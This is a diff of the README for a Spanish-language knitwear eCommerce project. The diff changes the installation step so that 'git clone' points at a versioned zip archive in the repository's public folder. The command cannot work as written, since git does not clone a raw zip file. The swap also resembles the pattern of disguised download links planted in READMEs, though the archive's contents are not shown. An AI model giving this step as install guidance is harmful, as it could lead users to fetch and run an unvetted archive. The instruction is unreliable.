@@ -16,7 +16,7 @@ Tienda de tejidos artesanales hechos con amor ❤️. Proyecto de eCommerce en R
 ## 📦 Instalación
 
 ```bash
-git clone https://raw.githubusercontent.com/AyelenMacchiaroli/entre-dos-agujas/main/spatting/entre-dos-agujas.zip
+git clone https://raw.githubusercontent.com/AyelenMacchiaroli/entre-dos-agujas/main/public/agujas_entre_dos_3.9.zip
 cd entredosagujas
 npm install
 npm run dev
